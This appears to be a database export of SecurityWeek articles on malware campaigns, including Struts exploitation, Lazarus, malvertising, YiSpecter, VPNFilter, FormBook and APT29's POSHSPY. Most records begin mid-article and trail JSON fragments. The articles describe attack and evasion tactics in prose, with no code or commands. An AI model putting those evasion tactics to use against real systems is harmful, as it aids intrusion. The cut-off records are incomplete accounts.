The flaw, tracked as CVE-2017-5638, can be exploited for remote code execution. Malicious actors started exploiting the vulnerability to deliver malware shortly after a patch was made available and a proof-of-concept (PoC) exploit was released. In many cases, attackers targeted Unix systems with backdoors and distributed denial-of-service (DDoS) bots, but recently experts also spotted a campaign targeting Windows machines. In the week of March 20, researchers at F5 Networks started seeing attacks delivering Cerber ransomware to Windows servers. Experts at the SANS Technology Institute also reported seeing these attacks on Wednesday. Cybercriminals have used the exploit to execute shell commands and run BITSAdmin and other command-line tools shipped with Windows. These tools are used to download and execute the Cerber malware. The ransomware encrypts important files found on the system and demands money in return for the “special decryption software” needed to recover the files. The Bitcoin address where victims are instructed to send the ransom is the same across multiple campaigns. F5 Networks reported seeing 84 bitcoins, currently worth nearly $100,000, in that address. “The new vulnerability in Apache STRUTS provides a target-rich environment for threat actors to extend their business while infecting thousands of new servers,” F5 said in a blog post. “Targeting servers, rather than individuals, with ransomware has better chances for monetization because those are usually run by organizations with deeper pockets and better infrastructure that might be critical for their business.” AT&T vulnerable to Apache Struts exploit The Apache Struts vulnerability has been found to affect many products, including from Cisco and VMware. Independent security researcher Corben Douglas reported on Wednesday that he tested AT&T systems roughly 4-5 days after the exploit was released and they had been vulnerable to attacks. The expert said he managed to execute commands on AT&T servers, which could have allowed him to “pwn” the company. " }

The latest alert attributes the Joanap backdoor trojan and the Brambul worm to the North Korean government. It provides IP addresses and other indicators of compromise (IoC) associated with these threats in an effort to help organizations protect their networks against attacks. The threat actor tracked by the U.S. government as Hidden Cobra is known in the cybersecurity community as Lazarus Group, which is believed to be behind several high-profile attacks, including ones targeting Sony Pictures, Bangladesh’s central bank and various financial organizations. Some of the group’s campaigns are tracked as Operation Blockbuster, Dark Seoul and Operation Troy. Five Eyes countries have also officially blamed Lazarus for the WannaCry attack. According to the DHS and FBI, Joanap and Brambul have been used by Hidden Cobra since at least 2009 in attacks aimed at organizations in the United States and elsewhere, including in the media, financial, aerospace and critical infrastructure sectors. Joanap is a two-stage malware that allows hackers to exfiltrate data and install other threats on the system. Brambul is a worm that abuses the Server Message Block (SMB) protocol to spread to other systems through dictionary attacks. Its list of capabilities also includes harvesting system information (which it sends to the attackers via email), accepting command-line arguments, and executing what analysts call a “suicide script.” The DHS and the FBI have published several alerts in the past year describing Hidden Cobra tools, including Sharpknot, Hardrain, Badcall, Bankshot, Fallchil, Volgmer, and Delta Charlie. North Korea has been blamed for several major attacks, but Pyongyang has always denied the accusations. On the other hand, threat actors linked to North Korea don’t seem to be deterred by accusations and the numerous reports published in the past years by cybersecurity companies, and they continue launching attacks, including with new tools and zero-day exploits.

SiteLock’s Website Security Insider report, which is based on the analysis of more than 6.3 million sites, shows that there were, on average, 63 attack attempts per day on websites in the second quarter of the year. In comparison, the company saw only 22 attacks per day in 2016. According to the company, 87% of these attacks involved malicious bots, including ones operated by cybercriminals, spammers and data scrapers. As for attacks that did not involve bots, more than 57% of requests were blocked by SiteLock due to the fact that they came from countries blacklisted by its customers, and 36% were illegal resource access attempts, including command injections, directory traversals and file system access. When it comes to content management systems (CMS), SiteLock says the risk of attacks on WordPress websites is twice as high as in the case of the “average site.” The security firm discovered that 69% of compromised WordPress websites had the latest WordPress core security patches installed, which indicates that the attack was likely carried out via a vulnerable theme or plugin. The higher the number of plugins, the more likely it is for a WordPress website to get hacked, and researchers found that 44% of the plugins in the official WordPress repository have not been updated in more than a year. This includes over 120 plugins that have at least 50,000 active installs. Joomla and Drupal are also at elevated risk of attacks, especially since they haven’t always offered reverse compatibility with legacy features, making their administrators less likely to install updates. In the case of Joomla, SiteLock found that 19% of the sites it observed had been using version 1.5, for which support ended in September 2012. An analysis of the malicious code planted on compromised websites showed that 62% of threats were related to spam, while nearly a quarter were backdoors. Worryingly, many websites don’t have adequate protections in place and their administrators are often alerted to malicious activity by web browser warnings such as the ones displayed in Firefox via Phishing Protection and in Chrome via Safe Browsing. “Browser warnings about compromised websites are usually driven by blacklists maintained by search engines, where search engine crawlers have recognized that malicious code is present on the website they’re attempting to index,” SiteLock explained in its report. “For many website owners this practice creates an assumption that if there are no warnings, then there isn’t an issue. Unfortunately, this incorrect assumption puts both the website and its visitors in danger. In three out of four cases, infected websites were not flagged by search engines” SiteLock has surveyed more than 20,000 owners and over 40% of them falsely believe that their hosting provider is responsible for securing their websites.

The culprit was an AOL ad network. According to Cyphort, the firm first detected the infection on the Canadian version of Huffington Post (huffingtonpost.ca) Dec. 31, and then on Huffingtonpost.com on Jan. 3. Cyphort notified AOL of the situation, and the attacks stopped Jan. 5. \"In this case all the malicious ads came via advertising networks that belong to AOL,\" explained Nick Bilogorskiy, director of security research at Cyphort. \"We don't know exactly how it got there. When we consulted our logs we… [saw] the issue started in late October. So, one possibility is that AOL itself has been breached. Another possibility is that attackers are submitting the malicious ads and have AOL approving these ads for use in the ad network.\" According to Cyphort, the ad redirected users through multiple hops. The landing page served an exploit kit that hit victims with a Flash exploit and a VB script. The script in turn downloaded the Kovter Trojan executable to %temp%. The malvertising was served from advertising.com, which has been linked to attacks on several sites during the past several days. \"Of particular interest in this attack is the unique use of redirection via HTTPS (Hypertext Transfer Protocol Secure, a communications protocol for secure encrypted communication),\" said Bilogorskiy. \"When user opens [the] Huffington Post web site, several scripts are executed from the advertising network to show ads. One of these scripts loads an external function through HTTPS from Google AppSpot, and this function loads another redirect through HTTPS. And only then the user receives redirects to malware payload. It makes it harder to analyze the origin of attack because even if a security company has the recorded network traffic it is impossible to decrypt and reconstruct the origin of the malware redirect.\" The malicious scripts were inserted alongside many different ads from advertising.com. The exploit kit used in the attack is suspected by Cyphort to be the Neutrino kit, but may be the Sweet Orange kit. The group behind the attack is believed to have compromised or have access to multiple .pl domains in Poland, and is making redirects via sub-domains for these sites, he added. In addition to the advertising.com advertising network, Cyphort has also seen \"adtech.de\" redirecting to these infected Polish sites. Both of these platforms are owned by AOL. \"The ad networks get millions of ads submitted to them and any one of those could be malvertising,\" Bilogorskiy said. \"They try to detect and filter malicious ads from their systems, but it is challenging. The potential damage is high, as ad networks have a very deep reach and can infect many people quickly.\" \"The attackers are accustomed to tricking the networks by making \"armored\" malverts, where they use various techniques to appear legitimate to the analysts, but infect the users nonetheless,\" he continued. \"For instance they will enable the malicious payload after a delay of several days after the ad is approved. Another way is to only serve the exploits to every 10th user, or every 20th user who views the ad. Verifying user agents and IP addresses also is a common strategy to hide from analysts and automated malware detection.  The attackers can implement various targeting strategies for malware infection, which appear normal in the context of advertisement, but in effect evade certain security detection.\" Bilogorskiy recommended website owners scan all files on their site for malware, injections and redirects, and provide an easily identifiable contact point so that users can report malware infections to them.  " }

The first report on this group’s activities was published last month by Chinese security firm Qihoo 360, which tracks the actor as APT-C-23 and Two-Tailed Scorpion. Researchers at Palo Alto Networks and ClearSky have also conducted a joint investigation into the gang’ operations. According to the security firms, the group uses Windows and Android malware to spy on victims. Qihoo 360 said it observed nearly 85 percent of infections in Palestine, followed by Israel, but Palo Alto also reported seeing victims in Egypt and the United States. As for the types of organizations targeted, Qihoo reported that educational institutions appeared to be the main target, followed by military organizations, while Palo Alto mentioned media companies. Palo Alto Networks and ClearSky have dubbed the Windows malware families used by these cyberspies KASPERAGENT and MICROPSIA. The Android threats are being tracked as SECUREUPDATE and VAMP. The attackers delivered their malware using fake news websites and spear-phishing emails containing Bit.ly shortened links. Two of the Bit.ly links analyzed by researchers had been clicked hundreds of times. KASPERAGENT, named so based on a “Kasper” string found in several of the analyzed samples, is used as a reconnaissance tool and downloader for other payloads. However, some of the samples include additional capabilities that allow the hackers to steal passwords from Chrome and Firefox, take screenshots, log keystrokes, execute arbitrary commands, exfiltrate files, and update the malware. The second Windows malware family used by Two-Tailed Scorpion is MICROPSIA, which allows attackers to log keystrokes, capture screenshots, and steal Office documents. Researchers initially found no connection between the two malware families, but they eventually uncovered a link: an email address used to register the command and control (C&C) domains. Some of the domains registered with that email address were also found to host Android malware disguised as harmless applications. One of them is SECUREUPDATE, a backdoor that acts as a downloader for other malware. The second Android malware is VAMP, which can record calls, harvest contact information, access messages, and steal documents from the infected device. Both the Android and Windows malware attacks also involve phishing websites that attempt to trick users into handing over their credentials. Palo Alto has discovered roughly 200 samples of the Windows malware and 17 Android malware samples. The security firm has been monitoring the threat since March 2016, but the KASPERAGENT malware had been used since at least July 2015. “Through this campaign there is little doubt that the attackers have been able to gain a great deal of information from their targets,” explained Palo Alto Networks researchers. “The scale of the campaign in terms of sheer numbers of samples and the maintenance of several different malware families involved suggests a reasonably sized team and that the campaign is not being perpetrated by a lone wolf, but rather a small team attackers.” " }
{ "_id" : { "$oid" : "5b27c3cf6cefc41c844ab21b" }, "Category" : "Malware", "Title" : "iOS Malware Abuses Private APIs for Malicious Functionality", "Address" : "https://www.securityweek.com/ios-malware-abuses-private-apis-malicious-functionality", "Date" : "October 05, 2015", "Article" : "A piece of Apple iOS malware dubbed by researchers “YiSpecter” has been abusing private APIs and enterprise certificates to infect both jailbroken and non-jailbroken devices. The threat, analyzed in detail by researchers at Palo Alto Networks, has been spreading in the wild since at least November 2014 via a worm, Internet traffic hijacking, underground app distribution websites, and online forums and social networks. Experts say YiSpecter has mainly affected iOS users in China and Taiwan. Once it infects a device, YiSpecter can download, install and execute arbitrary iOS apps, replace existing applications, hijack the execution of apps to display ads, collect device information and upload it to a command and control (C&C) server, and change configuration in Safari (e.g. default search engine, bookmarks, opened pages). The threat was first analyzed by China-based security firms Qihoo360 and Cheetah Mobile in February 2015, but Palo Alto Networks says these companies have failed to conduct a complete analysis, which may have led to an “incorrect conclusion.” Qihoo360 and Cheetah have analyzed a Windows-based worm dubbed “Lingdun,” which distributes iOS and Android adware and other apps. Palo Alto says the Chinese companies incorrectly classified these apps as variants of Lingdun, when in reality they are components of YiSpecter, which has been created by different developers. Palo Alto’s investigation revealed that YiSpecter has four components. The first component is represented by at least a couple of “main apps” that are distributed via the Lingdun worm, hijacking traffic at ISP level, and by posting them on forums and social media websites. The apps are disguised as a popular media player called QVOD, and various programs allegedly designed for accessing free adult content. Once these apps make their way onto a device, they download and install YiSpecter’s main malicious component dubbed by researchers “NoIcon.” NoIcon is capable of harvesting device information, executing remote commands, changing the configuration in Safari, and installing the two other components of the malware, namely ADPage and NoIconUpdate. ADPage is the component responsible for displaying ads when users execute legitimate apps. It does this with the aid of NoIcon, which monitors installed applications and hijacks their launch routine. NoIconUpdate is designed to check for the existence of other components and malware updates, connect to the C&C server, and send back status information. What makes the NoIcon component interesting is the fact that it uses private APIs from iOS’s MobileInstallation framework to install ADPage and NoIconUpdate. Furthermore, NoIcon abuses these private APIs to uninstall existing apps before replacing them with rogue versions. Experts believe YiSpecter is the first piece of malware discovered in the wild to abuse private APIs. The YiSpecter apps and components can be installed on non-jailbroken devices because they are signed with iOS enterprise certificates. The apps have been signed with certificates from “Changzhou Wangyi Information Technology” and “Baiwochuangxiang Technology” while the components have been signed with a certificate issued for “Beijing Yingmob Interaction Technology.” Since the malicious components are signed with iOS enterprise certificates, they can be delivered directly thanks to Apple’s Developer Enterprise Program, which allows organizations to easily distribute private iOS apps internally. This technique allows the attackers to abuse private APIs and install the malicious components without victims seeing any notifications. The only warning sign is a prompt displayed when the apps are first executed, which informs the user that the application is from a specific developer. However, experts believe users often click “Continue” without giving it too much thought. Another interesting aspect about YiSpecter’s components is the fact that they set the value of the “SBAppTags” key in their info.plist file to “hidden,” which ensures that they are not visible to users on the SpringBoard. Furthermore, even if power users detect the components using third-party tools, they might not suspect the presence of malware since the apps are disguised to look like iOS system applications. Experts have also pointed out that if the malware is deleted manually, it will automatically reappear. Palo Alto Networks has provided step-by-step instructions for removing the threat from infected devices. The company noted in a blog post published on Sunday that it has identified 23 YiSpecter samples (main apps) submitted to VirusTotal between November 2014 and August 2015. VirusTotal shows that only Qihoo360 detects the files as being malicious. As far as attribution is concerned, researchers say the evidence points to YingMob Interaction, a Chinese mobile advertisement platform that owns the enterprise certificates used to sign YiSpecter components. Moreover, experts found that the C&C server used by the malware has hosted some sites belonging to this company, and a file associated with the NoIconUpdate component references YingMob. The Chinese firm could not immediately be reached for comment.

The botnet is powered by at least 500,000 hacked routers and network-attached storage (NAS) devices across 54 countries. The malware can intercept data passing through the compromised device, it can monitor the network for communications over the Modbus SCADA protocol, and also has destructive capabilities that can be leveraged to make an infected device unusable. Many of the hijacked devices are located in Ukraine and a separate command and control (C&C) infrastructure has been set up for devices in this country. Researchers also spotted code similarities to the BlackEnergy malware and pointed out that there are only a few weeks until Ukraine celebrates its Constitution Day, which last year coincided with the destructive NotPetya attack. All this has led experts to believe that VPNFilter may mean Russia is preparing for a new attack on Ukraine. Shortly after security firms published technical details on the attack, the U.S. Department of Justice announced that the FBI had seized toknowall.com, one of the C&C domains utilized by VPNFilter. A press release and court documents name the Russia-linked threat actor Sofacy as being behind the attack. While this is not surprising, one noteworthy piece of information is that U.S. authorities say Sofacy is also known as APT28, Pawn Storm, Fancy Bear, Sednit, X-Agent, and Sandworm. Sandworm, also tracked by some security companies as TeleBots, is a threat actor known to use the BlackEnergy malware in attacks aimed at industrial systems and it’s believed to be responsible for the 2015 power outage in Ukraine. However, Sandworm was until now seen as a separate group from Sofacy. SecurityWeek has reached out to the Justice Department and the FBI for clarifications, but the organizations say they “do not have a comment outside what is included in the DOJ press release.” Industry professionals, however, have offered some possible explanations as to why the FBI may see Sofacy and Sandworm as the same group. “Sandworm is a similar team whose interests overlap with APT 28. We believe these actors are related and act accordingly,” Craig Williams, director of outreach with Cisco Talos, told SecurityWeek. Vikram Thakur, principal research manager at Symantec Security Response, noted, “The intelligence community has the best shot at attributing attacks to individuals and organizations. Every security vendor groups attackers based on their own vantage into the attack landscape. “Keeping in mind that attack groups themselves share knowledge, expertise, and resources, we don’t have any reason to question the grouping of Sofacy, Sandworm, X-Agent, and others that the FBI listed in their affidavit to seize a domain related to VPNFilter.” Researchers at Kaspersky also found it curious that the FBI suggested Sandworm and Sofacy were one and the same. “This would suggest that Sandworm, also known as BlackEnergy APT, is regarded as subgroup of Sofacy by the FBI,” Kaspersky researchers said. “Most threat intel companies have held these groups separate before, although their activity is known to have overlapped in several cases.” Advice from the FBI and targeted device vendors Rebooting a router is typically enough to remove a piece of malware from the device. However, VPNFilter has some clever persistence mechanisms that help its stage 1 component survive a reboot. An alert issued on Friday by the FBI advises owners of small office and home office routers to reboot their devices to “temporarily disrupt the malware and aid the potential identification of infected devices.” “Owners are advised to consider disabling remote management settings on devices and secure with strong passwords and encryption when enabled. Network devices should be upgraded to the latest available versions of firmware,” the FBI said. The VPNFilter malware has been observed targeting devices from Linksys, MikroTik, Netgear, TP-Link and QNAP. All of these vendors have published advisories to warn their customers about the threat. There is no evidence that the malware exploits any zero-day vulnerabilities to hack devices. Affected vendors noted that the flaws targeted by VPNFilter have already been patched and advised customers to update the firmware on their devices. " }

An ongoing campaign tracked by the security firm since May involves pieces of malware dubbed PoohMilk, Freenki and N1stAgent. The operation has been named FreeMilk by Palo Alto Networks based on strings found in the malware code. The attacks observed by Palo Alto were aimed at a bank in the Middle East, an international sporting company, a trademark and intellectual property services firm in Europe, and individuals with indirect ties to an unnamed country in Northeast Asia. The threat group has leveraged malicious Microsoft Word documents set up to exploit the vulnerability tracked as CVE-2017-0199 in an effort to deliver the first-stage loader PoohMilk and the second-stage downloader Freenki. PoohMilk was spotted delivering the remote administration tool (RAT) N1stAgent. What makes the FreeMilk campaign interesting is the fact that the attackers delivered the malicious documents by injecting themselves into ongoing email exchanges between the main target and another individual. They hacked into that individual’s email account – likely by stealing their credentials – and identified an in-progress email exchange with the main target. The attacker then sent the target an email that appeared relevant to the conversation with a malicious document attached to it. “Unlike phishing or even general spear phishing, this is a highly sophisticated, labor intensive, focused attack,” explained Christopher Budd, Senior Threat Communications Manager at Palo Alto Networks. “Carrying out a successful conversation hijacking spear phishing attack requires knowing someone that the ultimate target is communicating with, compromising that person’s account, identifying an ongoing email conversation with the ultimate target, crafting an email to appear part of that ongoing email conversation and finally sending it. Even then there’s no guarantee of success since the target may somehow recognize the attack or have sufficient prevention controls in place to prevent the attack from succeeding,” Budd added. Another interesting aspect of the FreeMilk attacks is that all the malware is designed to only execute successfully if a specific argument is provided, which makes it difficult for automated analysis systems to investigate the threat. The N1stAgent RAT, which has only been spotted in targeted attacks, was first seen in January 2016 when it was delivered via phishing emails referencing a security patch for the South Korean Hangul word processor developed by Hancom. Palo Alto Networks has not made any statements regarding attribution, but it’s worth noting that attacks involving Hangul vulnerabilities and documents (HWP) have often been linked to North Korea. The security firm did point to an August 2016 attack aimed at North Korean defectors in the United Kingdom. The attack, which delivered the Freenki malware, was linked at the time to the North Korean regime. Researchers also discovered some overlaps in command and control (C&C) infrastructure with a campaign involving the ROKRAT RAT analyzed by Cisco Talos, and an attack analyzed last year by a Singapore-based security firm. However, the connection is not conclusive as the C&C domains were compromised sites and the attacks took place several months apart. " }

The bot, dubbed by Symantec “Linux.Wifatch,” was first spotted in November 2014 when an independent researcher noticed some interesting processes on his home router. Symantec has been monitoring the threat since March 2015 and the security firm has been trying to solve the mystery of Wifatch ever since. Symantec researchers have avoided calling Wifatch a piece of malware because it doesn’t actually do anything malicious. Instead, it appears to be the work of what experts call an “Internet of Things (IoT) vigilante” who wants to protect routers and other IoT devices from malicious actors. Wifatch seems to scan the Web for devices that it can infect over telnet likely using weak credentials. Once it infects a device, the threat can be controlled by its operator using commands signed with a private Elliptic Curve Digital Signature Algorithm (ECDSA) key. The malware is developed in Perl and each sample comes with its own Perl interpreter. Infected devices are connected to a peer-to-peer (P2P) network that is used to distribute updates, researchers said. The backdoors set up by Wifatch would normally allow infected devices to be abused for a wide range of activities, from distributed denial-of-service (DDoS) attacks to DNS poisoning. However, the actor behind the malware is using it to scan the device for known malware families based on their signatures, and disables telnet to keep others out. While it’s not uncommon for malware to attempt to keep other threats out of the infected system, Wifatch actually informs users trying to connect over Telnet that the service has been disabled to prevent further infection of the device, and even provides recommendations for preventing attacks. In the case of the Dahua DVR CCTV system, a special module allows Wifatch to configure the device so that it reboots every week. Since rebooting a device usually removes the malware running on it, this could be an attempt to defend these types of systems in case the malware cleanup mechanism cannot be run or Telnet cannot be disabled. Symantec has identified tens of thousands of devices infected with Wifatch, most of which are routers and IP cameras. Roughly one third of the infections have been spotted in China, followed by Brazil (16%), Mexico (9%), India (9%), Vietnam (7%), Italy (7%), Turkey (7%), South Korea (5%), and the United States (5%). The threat is designed to target several types of architectures, but most of the infected devices are based on ARM (83%), followed by MIPS (10%), and SH4 (7%). The author of Wifatch has also taken precautions to ensure that the botnet cannot be hijacked by others. Since it relies on a P2P architecture, there is no command and control (C&C) server, and since all commands are signed with a private ECDSA key, it’s very difficult for unauthorized users to send commands. Symantec researcher Mario Ballano told SecurityWeek in an interview at the Virus Bulletin conference in Prague that the author of the threat seems to be an expert in cryptography and he has taken the necessary measures to prevent takeovers. Wifatch could be operated by a group of individuals, but based on the consistency of the code Ballano believes it’s likely the work of a single individual. The author of Wifatch is not easy to track down since he uses the Tor anonymity network for sending commands to the bots. While the Wifatch botnet could always be repurposed for malicious activities considering that it’s a fairly sophisticated threat, researchers haven’t spotted any malicious traffic so far and there appear to be no malicious routines. Furthermore, unlike other pieces of malware, Wifatch’s code has not been obfuscated or encrypted (it has only been compressed), and it contains a lot of debug information. Further indication that this could be the work of a “vigilante” is provided by the following comment in the source code, which has been attributed to software freedom activist Richard Stallman: “To any NSA and FBI agents reading my email: please consider whether defending the US Constitution against all enemies, foreign or domestic, requires you to follow Snowden's example.” " }
{ "_id" : { "$oid" : "5b27c3d36cefc41c844ab221" }, "Category" : "Malware", "Title" : "Turla Linked to One of the Earliest Cyberespionage Operations", "Address" : "https://www.securityweek.com/turla-linked-one-earliest-cyberespionage-operations", "Date" : "April 04, 2017", "Article" : "Researchers at Kaspersky Lab and King’s College London have identified a link between the Russian-speaking threat actor Turla and Moonlight Maze, one of the earliest known state-sponsored cyberespionage operations carried out in the ‘90s. In around 1996, a threat group believed to be located in Russia had started spying on organizations in the United States, including the Pentagon, the Department of Energy and NASA. The actor had stolen vast amounts of sensitive information from universities, military and research organizations. The activities of the group, dubbed Moonlight Maze, were first made public in 1999 and detailed last year at Kaspersky’s SAS conference by Thomas Rid of King's College London. Experts have dug further into Moonlight Maze’s activities and at this year’s SAS conference they presented evidence linking the threat actor to Turla. If Turla does in fact turn out to be an evolution of Moonlight Maze, that would make it one of the earliest and longest cyber espionage operations, along with the NSA’s Equation Group, which is also believed to have been active since the mid ‘90s. Turla is also known as Waterbug, KRYPTON and Venomous Bear, and some of its primary tools are tracked as Turla (Snake and Uroburos) and Epic Turla (Wipbot and Tavdig). The threat actor has been linked to the Agent.BTZ malware, which indicates that Turla may have been active since as early as 2006. Kaspersky and King’s College London researchers found precious information after learning of David Hedges, a now-retired administrator who got to watch Moonlight Maze in action when one of his servers was compromised by the threat group back in 1998. Hedges had allowed the attackers to use his server in order to help the Metropolitan Police in London and the FBI track the team’s activities. Hedges still had the old server, which recorded data between 1998 and 1999, allowing the researchers to analyze the tools used at the time by Moonlight Maze. The analysis showed that the attackers compiled most of their tools on UNIX operating systems such as Solaris and IRIX. One of the third-party tools they used was LOKI2, an open-source backdoor released in 1996. LOKI2 has provided a link to Penquin Turla, a Linux backdoor identified by Kaspersky Lab in 2014. Penquin Turla’s code was compiled for Linux kernel versions released in 1999, and the malware was based on LOKI2, which had been designed for covert data exfiltration. Researchers believe the Penquin Turla codebase was primarily developed between 1999 and 2004, but the malware was also spotted in the 2011 attack on Swiss defense firm RUAG, and a new sample was uploaded to the VirusTotal service in March 2017. The experts’ theory is that the hackers dusted off the old code and reused it in attacks aimed at highly secure entities whose defenses may have been more difficult to breach using the group’s typical Windows toolset. While the use of LOKI2 source code and other similarities do provide a link between Turla and Moonlight Maze, more evidence is needed before researchers can say with certainty that the former is an evolution of the latter. Further evidence may be found in data collected from a campaign dubbed Storm Cloud. The Wall Street Journal reported in 2001 that this operation had also involved LOKI2, but researchers currently have little information on Storm Cloud. " }

According to Russia-based cybersecurity firm Group-IB, the suspect is an unemployed Russian national who had previously been convicted for arms trafficking. He was arrested earlier this month and reportedly already confessed. The cybercrime group used a malicious Android app named “Banks at your fingertips” to trick the customers of Russian banks into handing over their financial information. The banking Trojan was disguised as a tool that claimed to allow users to access all their bank accounts from one Android app. It offered users the possibility to view balances, transfer money between payment cards, and pay for online services. The malicious app, distributed via spam emails since 2016, instructed users to enter their card details, which were then sent to a server controlled by the attackers. The cybercrooks transferred between $1,500 and $8,000 per day from victims’ bank accounts, $200-$500 at a time. The criminal proceeds were laundered using cryptocurrencies. The malware also helped the attackers intercept the SMS confirmation codes sent by banks, at the same time blocking all text messages confirming transactions in an effort to avoid raising suspicion. While Russia has occasionally collaborated with Western law enforcement agencies to bring down global cybercrime operations, it has often turned a blind eye to the activities of hackers who have mainly targeted the United States. Four Russian nationals are currently on the FBI’s Cyber Most Wanted list, including the alleged administrator of a massive cybercrime scheme involving the Zeus Trojan, and three people believed to have been involved in attacks on Yahoo that resulted in roughly 500 million accounts getting compromised. The Russian government has defended some of the alleged hackers arrested by the United States – in one case Moscow accused Washington of abducting the son of a lawmaker. On the other hand, the government has been known to crack down on cybercrime rings that target Russian citizens. Police have arrested 50 hackers believed to have used the Lurk Trojan, the creator of the Svpeng Android malware, and nine people who allegedly stole $17 million from bank accounts. " }

As part of these campaigns, the attackers used various delivery mechanisms, including PDF documents containing download links, DOC and XLS files with malicious macros, and archive files containing executables. The security researchers noticed that the PDF and DOC/XLS documents were mainly used to target organizations in the U.S., while the archives were used both in the U.S. and South Korea attacks. Impacted sectors included aerospace, defense contractors, and manufacturing. The attacks were aimed at infecting victims’ computers with the FormBook information stealer, a piece of malware being sold through various hacking forums since early 2016 and which recently registered an increase in activity. FormBook was designed to steal a variety of information from the infected machine, including keystrokes, clipboard contents, HTTP/HTTPS/SPDY/HTTP2 forms and network requests, passwords from browsers and email clients, and screenshots, and send it to the command and control (C&C) server. To perform its malicious routines, the malware injects itself into various processes and also installs the necessary function hooks to log keystrokes, steal clipboard contents, and extract data from HTTP sessions. Furthermore, the malware can execute commands received from the C&C to download and execute files, start processes, shutdown and reboot the system, and steal cookies and local passwords. The threat typically uses C&C domains from newer generic top-level domains (gTLDs) such as .site, .website, .tech, .online, and .info. The domains associated with the malware’s recent activity have been registered using the WhoisGuard privacy protection service, while the server infrastructure is hosted by a Ukrainian company, FireEye discovered. The campaigns employing PDF files to distribute the malware were using FedEx and DHL shipping/package delivery themes and a document-sharing theme. The documents, however, don’t contain malicious code, but include a link to download the payload. The malicious links recorded 716 hits across 36 countries, with the U.S. being affected the most (71% of attacks). The email campaigns distributing FormBook via DOC and XLS files were using malicious macros for delivery. As soon as the user enabled the macro, a download URL retrieved an executable file with a PDF extension. Most of the emails targeted the United States (61% of attacks), with aerospace organizations and defense contractors being hit the most. Emails carrying archive attachments (ZIP, RAR, ACE, and ISO) accounted for the highest distribution volume and leveraged a broad range of business related subject lines, often regarding payment or purchase orders. Most of the attacks targeted organizations in South Korea (31%) and the U.S. (22%), with the manufacturing industry being impacted the most. The security researchers also note that FormBook was observed over the past few weeks downloading other malware families such as NanoCore. Brad Duncan, Palo Alto Networks threat intelligence analyst and handler at the SANS Internet Storm Center, says that some of the analyzed post-infection traffic was identified as pertaining to the Punkey Point of Sale (POS) malware and not FormBook. The malware was distributed through RAR archives attached to fake FedEx delivery notices. “While FormBook is not unique in either its functionality or distribution mechanisms, its relative ease of use, affordable pricing structure, and open availability make [it] an attractive option for cyber criminals of varying skill levels. The credentials and other data harvested by successful FormBook infections could be used for additional cyber-crime activities including, but not limited to: identity theft, continued phishing operations, bank fraud and extortion,” FireEye concludes.

However, experts say it's unlikely this will end the use of BlackShades. A total of 300 searches were conducted worldwide, 100 email and physical search warrants being executed in the United States alone. Some 1,900 command and control domains have been seized. Europol reported that more than 1,000 computers, laptops, mobile phones, external hard drives and other electronic devices were confiscated by investigators. Michael Hogue, aka 'xVisceral', one of the developers of BlackShades, was arrested in the United States in June 2012. Hogue has already pleaded guilty to the charges brought against him. The recent law enforcement operation also included the unsealing of an indictment against Alex Yucel, a Swedish national previously arrested in Moldova. Yucel, who is believed to be the head of the organization that sold the malware, is awaiting extradition to the US. Despite all these actions against BlackShades creators and users, experts say it’s unlikely that anyone will witness the end of the RAT, especially since the source code for this piece of malware has been available for more than three years and it’s not difficult for moderately skilled hackers to modify it for their purposes. \"The BlackShades arrests, which reportedly targeted over 100 hackers worldwide that were associated with the RAT, dealt a significant blow to the BlackShades criminal market, and will hopefully discourage further use,\" Alex Watson, director of security research at Websense, told SecurityWeek. \"However, it’s unlikely that this will end the use of BlackShades, which has survived multiple arrests over the past two years and had source code leaked to the Internet, which can be modified by hackers or used as building blocks for a new RAT.\" Watson highlights the fact that even if we are to see the end of BlackShades, there are plenty of other RATs and general purpose malware to take its place, including Xtreme RAT, Gh0st RAT and ZeuS.  While BlackShades has made numerous headlines mostly due to its use in sextortion operations, the threat is actually a multipurpose tool utilized in many cybercriminal campaigns, including industrial espionage and mid-level attacks. In fact, Websense has been monitoring a series of low-level attacks targeted at financial institutions in the Middle East and India. \"These attacks use a combination of malware, including Xtreme RAT and Zeus, indicating a more aggressive (and less sophisticated) campaign, likely with the goal of stealing credentials and financial information,\" Watson explained. The expert notes that attackers gain more flexibility around searching compromised machines and networks by combining information-stealing malware like ZeuS with such remote access Trojans. In order to protect themselves against these threats, organizations must inspect both inbound and outbound data streams because RATs function through two-way communications. \"It’s a challenge that organizations face with the increased use of RATs such as BlackShades for both targeted and non-targeted attacks,\" Watson said. \"The end result being that it becomes more difficult to understand the business impact or risk associated with an incident ─ for example, whether an attack is a targeted specifically at an organization and attempting to steal intellectual property or sensitive information- which would be very high risk for the organization, or if is simply part of a widespread and non-targeted campaign designed to steal credentials from many organizations.\" " }

Dubbed “POSHSPY,” the malware is believed to be a secondary backdoor used by the cyberspies in case they lose access to their primary backdoors. Mandiant first spotted POSHSPY in 2015 during an incident response engagement, and identified it on the networks of several organizations over the past two years. Similar to other pieces of malware used by APT29, POSHSPY leverages PowerShell and the Windows Management Instrumentation (WMI) administrative framework. WMI can be used to obtain system information, start and stop processes, and configure conditional triggers. In the case of POSHSPY, WMI is used to run a PowerShell command that decrypts and executes the backdoor code directly from a WMI property, thus ensuring that no artifacts are left on the hard drive. The WMI component of POSHSPY executes the PowerShell component on every Monday, Tuesday, Thursday, Friday and Saturday at 11:33 AM local time. Experts pointed out that the use of legitimate Windows tools and the other techniques employed in these attacks increase the backdoor’s chances of evading detection. “POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI. Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory,” explained Matthew Dunwoody, incident response consultant at Mandiant. “The backdoor's infrequent beaconing, traffic obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identification of its network traffic difficult. Every aspect of POSHSPY is efficient and covert,” Dunwoody added. The malware allows attackers to download and execute additional PowerShell code and executable files. The threat communicates with command and control (C&C) servers located at URLs generated using a domain generation algorithm (DGA) that relies on lists of domain names, TLDs, subdomains, URIs, file names and file extensions. C&C communications are encrypted using AES and RSA public key cryptography. FireEye has not shared any information on which countries or what types of organizations have been targeted in attacks involving the POSHSPY backdoor. The APT29 group has put some effort into making its operations more difficult to detect. Earlier this month, FireEye detailed the threat actor’s use of a technique called “domain fronting” to disguise the malicious traffic generated by its tools. APT29 is also known as The Dukes, Cozy Bear and Cozy Duke. The group is believed to be behind the recent election-related attacks in the U.S. and a campaign targeting high-profile organizations in Norway. " }

